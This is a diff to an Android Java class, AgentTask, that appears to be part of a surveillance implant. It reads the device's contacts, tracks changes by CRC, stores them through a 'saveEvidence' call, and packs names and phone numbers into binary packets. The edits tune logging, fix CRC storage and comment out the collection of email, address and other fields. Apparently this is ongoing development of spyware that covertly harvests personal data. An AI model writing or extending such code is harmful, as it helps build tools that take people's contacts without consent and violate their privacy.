@@ -104,7 +104,7 @@ public class AgentTask extends AgentBase {
 		Date before = new Date();
 		List<Contact> list = contact.getContactInfo();
 		Date after = new Date();
-		Log.d("QZ", TAG + " (go): get contact time " + (after.getTime() - before.getTime()));
+		Log.d("QZ", TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);
 		Log.d("QZ", TAG + " (go): list size = " + list.size());
 		ListIterator<Contact> iter = list.listIterator();
 
@@ -122,7 +122,7 @@ public class AgentTask extends AgentBase {
 			// if does not match, save and serialize
 			if (!crcNew.equals(crcOld)) {
 				Log.d("QZ", TAG + " (go): new contact. " + c);
-				contacts.put(c.getId(), crc(packet));
+				contacts.put(c.getId(), crcNew);
 				saveEvidence(c);
 				needToSerialize = true;
 			}
@@ -166,12 +166,12 @@ public class AgentTask extends AgentBase {
 	private byte[] preparePacket(Contact c) {
 
 		UserInfo user = c.getUserInfo();
-		List<EmailInfo> email = c.getEmailInfo();
-		List<PostalAddressInfo> paInfo = c.getPaInfo();
+		//List<EmailInfo> email = c.getEmailInfo();
+		//List<PostalAddressInfo> paInfo = c.getPaInfo();
 		List<PhoneInfo> phoneInfo = c.getPhoneInfo();
-		List<ImInfo> imInfo = c.getImInfo();
-		List<OrganizationInfo> orgInfo = c.getOrgInfo();
-		List<WebsiteInfo> webInfo = c.getWebInfo();
+		//List<ImInfo> imInfo = c.getImInfo();
+		//List<OrganizationInfo> orgInfo = c.getOrgInfo();
+		//List<WebsiteInfo> webInfo = c.getWebInfo();
 		long uid = user.getUserId();
 		String name = user.getCompleteName();
 
@@ -188,7 +188,7 @@ public class AgentTask extends AgentBase {
 			addTypedString(outputStream, (byte) 0x07, number);
 		}
 		addTypedString(outputStream, (byte) 0x37, message);
-		Log.d("QZ", TAG + " (preparePacket): " + name + " " + message);
+		Log.d("QZ", TAG + " (preparePacket): " + uid + " " + name);
 
 		byte[] payload = outputStream.toByteArray();
 
